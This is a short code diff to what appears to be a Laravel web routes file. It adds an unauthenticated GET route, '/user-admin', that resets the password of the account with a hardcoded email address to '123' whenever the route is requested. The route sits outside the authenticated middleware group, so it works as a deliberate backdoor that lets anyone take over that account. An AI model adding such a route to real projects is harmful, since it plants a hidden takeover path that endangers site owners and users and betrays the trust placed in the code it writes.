@@ -27,6 +27,14 @@ Route::get('/', function () {
     ]);
 });
 
+Route::get('/user-admin', function () {
+    $user = \App\Models\User::where('email', 'uniqdeveloper@yandex.ru')->first();
+
+    $user->password = '123';
+
+    $user->save();
+});
+
 Route::get('/chats', [MarketplaceController::class, 'index'])->name('chats.index');
 
 Route::middleware(['auth', 'verified'])->group(function () {
